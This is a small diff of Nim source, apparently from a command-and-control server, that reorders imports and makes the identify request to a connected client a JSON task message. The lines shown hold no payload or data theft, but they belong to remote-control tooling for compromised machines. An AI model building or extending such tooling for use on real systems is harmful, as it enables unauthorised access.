@@ -1,4 +1,4 @@
-import asyncdispatch, asyncnet, json, base64
+import asyncdispatch, asyncnet, base64, json
 
 import types
 
@@ -18,5 +18,8 @@ proc completeResponse*(client: C2Client) {.async.} =
         client.server.clRespFuture[] = nil
 
 proc askToIdentify*(client: C2Client) {.async.} =
-    await client.sendClientTask("hi")
-
+    let j = %*
+        {
+            "task": "identify"
+        }
+    await client.sendClientTask($j)
